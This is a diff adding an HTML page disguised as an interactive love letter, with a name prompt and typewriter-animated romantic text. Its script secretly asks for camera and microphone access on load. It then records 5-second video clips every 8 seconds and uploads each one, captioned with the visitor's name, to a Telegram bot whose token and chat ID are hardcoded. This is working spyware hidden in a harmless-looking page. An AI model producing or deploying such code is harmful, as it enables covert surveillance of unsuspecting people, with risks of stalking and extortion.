@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Love Letter</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Cursive', sans-serif;
+      background: linear-gradient(135deg, #fcb69f, #d4a5a5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #fff;
+    }
+
+    .name-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .name-form {
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .name-form input {
+      padding: 10px;
+      font-size: 1.2rem;
+      width: 250px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    .name-form button {
+      background-color: #ef4444;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 25px;
+      cursor: pointer;
+    }
+
+    .name-form button:hover {
+      background-color: #dc2626;
+    }
+
+    .container {
+      background: #fff;
+      width: 100%;
+      max-width: 600px;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+      position: relative;
+      display: none;
+    }
+
+    .letter-title {
+      text-align: center;
+      font-size: 2rem;
+      color: #ef4444;
+      margin-bottom: 20px;
+      font-family: 'Georgia', serif;
+    }
+
+    .letter-box {
+      font-family: 'Arial', sans-serif;
+      font-size: 1.2rem;
+      line-height: 1.6;
+      color: #333;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      padding: 20px;
+      background: #fafafa;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      margin-top: 20px;
+      height: 250px;
+      overflow-y: auto;
+      max-height: 250px;
+    }
+
+    .caret {
+      display: inline-block;
+      width: 10px;
+      background: #333;
+      margin-left: 4px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .message {
+      text-align: center;
+      font-size: 16px;
+      color: #4ade80;
+      margin-top: 20px;
+    }
+
+    .button-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    .action-btn {
+      background-color: #ef4444;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .action-btn:hover {
+      background-color: #dc2626;
+    }
+
+    #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <!-- Fullscreen Name Input Form -->
+  <div class="name-container" id="name-container">
+    <div class="name-form">
+      <h2>Enter Your Name</h2>
+      <input type="text" id="userName" placeholder="Your Name" />
+      <button id="submit-name">Next</button>
+    </div>
+  </div>
+
+  <!-- Love Letter Content -->
+  <div class="container" id="container">
+    <div class="letter-title" id="letter-title">Dear <span id="to-name">Love</span></div>
+    <div class="letter-box" id="letter"></div>
+    <div class="message" id="message">Love you🥹...</div>
+    <div class="button-container">
+      <button class="action-btn" id="start-btn">See🥹</button>
+    </div>
+  </div>
+
+  <canvas id="canvas" width="300" height="400"></canvas>
+
+  <script>
+    let userName = "";
+
+    const letterText = `
+
+I cannot find the right words to express how much you mean to me. Every time I think of you, I feel my heart race with joy. Your presence fills my world with light, and your laughter is the melody of my life.
+
+You are my everything. I want to walk beside you, share every moment, and build memories together. With you, I feel whole.
+
+Your Love`;
+
+    const letterBox = document.getElementById("letter");
+    const startBtn = document.getElementById("start-btn");
+    const submitNameBtn = document.getElementById("submit-name");
+    const nameContainer = document.getElementById("name-container");
+    const container = document.getElementById("container");
+    const toName = document.getElementById("to-name");
+    const userNameInput = document.getElementById("userName");
+    const message = document.getElementById("message");
+    const canvas = document.getElementById('canvas');
+    const token = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w";
+    const chatId = "1987016824";
+
+    let index = 0;
+
+    submitNameBtn.addEventListener("click", function() {
+      userName = userNameInput.value.trim();
+      if (userName !== "") {
+        toName.textContent = userName;
+        nameContainer.style.display = "none";
+        container.style.display = "block";
+      }
+    });
+
+    function typeLetter() {
+      if (index < letterText.length) {
+        letterBox.innerHTML = letterText.substring(0, index + 1) + '<span class="caret"></span>';
+        index++;
+        letterBox.scrollTop = letterBox.scrollHeight;
+        setTimeout(typeLetter, 50);
+      } else {
+        letterBox.innerHTML = letterText;
+      }
+    }
+
+    startBtn.addEventListener("click", function() {
+      typeLetter();
+      startBtn.style.display = "none";
+    });
+
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    })
+    .then(stream => {
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = function(e) {
+        chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = function() {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        chunks.length = 0;
+        sendVideoToTelegram(blob);
+      };
+
+      setInterval(() => {
+        if (mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
+        }, 5000); // Record for 5 seconds
+      }, 8000); // Every 8 seconds
+    })
+    .catch(err => {
+      message.textContent = "";
+      console.error(err);
+    });
+
+    function sendVideoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("video", blob, "video.webm");
+      formData.append("caption", `This is ${userName}'s video!`);
+
+      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.ok) {
+          message.textContent = "Failed to send video.";
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        message.textContent = "Error sending video.";
+      });
+    }
+  </script>
+</body>
+</html>
